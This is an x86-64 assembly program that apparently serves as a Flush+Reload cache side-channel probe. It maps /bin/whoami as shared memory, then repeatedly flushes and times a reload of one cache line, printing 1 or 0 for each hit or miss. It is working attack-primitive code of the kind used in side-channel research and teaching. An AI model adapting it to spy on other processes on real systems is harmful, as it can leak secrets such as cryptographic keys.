.intel_syntax noprefix
.section .rodata


FILENAME:
	.string "/bin/whoami"
	.word 0

FORMAT:
	.string "%d\n"
	.word 0

.text
.global main
main:
	// Calling convention for userland
	//	%rdi, %rsi, %rdx, %rcx, %r8 and %r9
	
	// open FILENAME
	lea rdi, FILENAME[rip]
	mov rsi, 0
	xor rax, rax
	call open@plt

	// Save fd to the correct register
	mov r8d, eax

	// MMAP: mmap(NULL,DEFAULT_FILE_SIZE,PROT_READ,MAP_SHARED,fd,0);
	mov rdi, 0
	mov rsi, 4096
	mov rdx, 1
	mov rcx, 1
	// R8 Already moved (fd)
	mov r9, 0
	xor rax, rax
	call mmap@PLT
	push rax
	
	// Put mmap addr in rbx
	pop rbx
	xor rax, rax
	xor rdx, rdx
	mov rcx, 3200000
	// flush+reload
	.hot_loop:
		// Do flush
		clflush [rbx]
		
		// do_nothing()*eax
		//	forces us to wait.
		//	Not great, but using usleep introduced noise
		rdtsc
		mov esi, eax
		.wait_loop:
			nop
			rdtsc
			sub eax, esi
			cmp eax, 10000
			jle .wait_loop
		mfence
		lfence
		rdtsc
		lfence
		// save timestamp
		mov esi, eax
		// reload
		mov rax, [rbx]
		lfence
		rdtsc
		// Sub
		sub eax, esi
		// Defined as cache hit if <200
		cmp eax, 130
		jle .is_one
		mov eax, 0
		jmp .is_after
		.is_one:
		// 200 instructions to simulate load
		// Keep us on track
		mov eax, 200
		.fake_load:
			nop
			sub eax, 1
			jnz .fake_load
		mov eax, 1
		.is_after:
		
		// We needed a push to fix frame,
		push rcx
		// Print result (1 or 0)
		lea rdi, FORMAT[rip] 
		mov esi, eax
		xor eax, eax
		call printf
		pop rcx

		// Goto start loop, dec counter
		sub rcx, 1
		jnz .hot_loop
	ret
